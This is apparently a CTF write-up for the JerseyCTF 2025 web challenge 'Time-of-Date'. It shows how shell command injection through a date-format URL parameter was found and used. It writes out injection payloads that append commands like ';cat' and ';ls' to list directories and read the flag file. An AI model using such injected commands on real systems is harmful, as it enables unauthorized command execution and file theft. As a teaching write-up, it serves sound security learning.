---
layout: post
title: "JerseyCTF 2025: Time-of-Date"
date:   2025-03-30
author: me
tags: [writeup, web]
---

author: @wxrth
## **Challenge Info:**
##### Category: Web

![](https://cdn.discordapp.com/attachments/1250994621438496849/1356213464195924098/Screenshot_2025-03-31_at_6.25.51_AM.png?ex=67ebbfb7&is=67ea6e37&hm=094d939823e93df02e7afb158e1dc8089462255af88434b8dcadeebcc3e93ac0&)

## TL;DR:

This challenge looked like a harmless date formatting demo, but behind the scenes, it was vulnerable to unsanitized shell command injection. I injected `;cat /home/secureuser/app/flag.txt` into the format parameter and retrieved the flag.

## The Challenge (Solution): 

The site presented a basic form of time formatting. The URL looked like this:

```http
http://time-of-date.aws.jerseyctf.com/?format=%22%Y-%m-%d%22
```

Website response:

![](https://cdn.discordapp.com/attachments/1250994621438496849/1356213457405345824/Screenshot_2025-03-31_at_5.56.15_AM.png?ex=67ebbfb5&is=67ea6e35&hm=1427a8c7fbea6fa7cb0fd10b0412a783482683dc55598d7b66a4e700d121769f&)

It displayed the current date, and nothing more. But the challenge title - "Time-of-Date" - and the hint:

> “Never trust user input.”

…indicated the input might be handled insecurely.

#### Step 1: Just playing around: 

First thing I did was try some random inputs, like:

```http
http://time-of-date.aws.jerseyctf.com/?format=%Y123
```

The website responded with:

![](https://cdn.discordapp.com/attachments/1250994621438496849/1356213457699209371/Screenshot_2025-03-31_at_6.05.23_AM.png?ex=67ebbfb5&is=67ea6e35&hm=e3201962e7141f99219e59362d8ed7d4be9fadbf1922a544e2815a24a408e87b&)

So `%Y` showed the year, and `123` just got added after it like normal text. That told me the input was being passed straight into the `date` command.

From the way it acted it was clear the server was running something like:

```bash
date +"<user_input>"
```

Which meant I could try adding other commands after it using `;`.

#### Step 2: Chasing the Flag:

My first instinct right after was to read `/flag.txt`:

```http
http://time-of-date.aws.jerseyctf.com/?format=;cat%20/flag.txt
```

The website responded with:

![](https://cdn.discordapp.com/attachments/1250994621438496849/1356213457980100648/Screenshot_2025-03-31_at_6.11.11_AM.png?ex=67ebbfb5&is=67ea6e35&hm=0e9899b8084846b9c604578df3226bcc5256b76b7234dc39d943aa056727533d&)

Well would you look at that I found some kind of path (I boxed it in red so it’s clear).

Since the error showed this path:

```
/home/secureuser/app/dist/index.js
```

I figured the app was running out of the `/home/secureuser/app` directory. So why not list what’s in there?

So I ran this:

```http
http://time-of-date.aws.jerseyctf.com/?format=;ls%20/home/secureuser/app
```

The website responded with: 

![](https://cdn.discordapp.com/attachments/1250994621438496849/1356213458345132083/Screenshot_2025-03-31_at_6.18.52_AM.png?ex=67ebbfb5&is=67ea6e35&hm=ed465b91ed9b6d9b4c42411cef4b0c5833aac78b712fd5bb756aafd4c12847dd&)

there it is. `flag.txt` just sitting there.

#### Step 3: LETS GRAB THE FLAG:

Next up, I went straight for the flag with:

```http
http://time-of-date.aws.jerseyctf.com/?format=;cat%20/home/secureuser/app/flag.txt
```

The website responded with: 

![](https://cdn.discordapp.com/attachments/1250994621438496849/1356213463738748958/Screenshot_2025-03-31_at_6.22.07_AM.png?ex=67ebbfb6&is=67ea6e36&hm=273d648891c170f883708729916501ee45a85718b09dd87f6c131eef9ec35a14&)

No date, no formatting just the flag printed right to the page. :)


## 🚩 **Final flag**:  `jctfv{T1MeF1I3SWhenyoURhAViNGfun}'
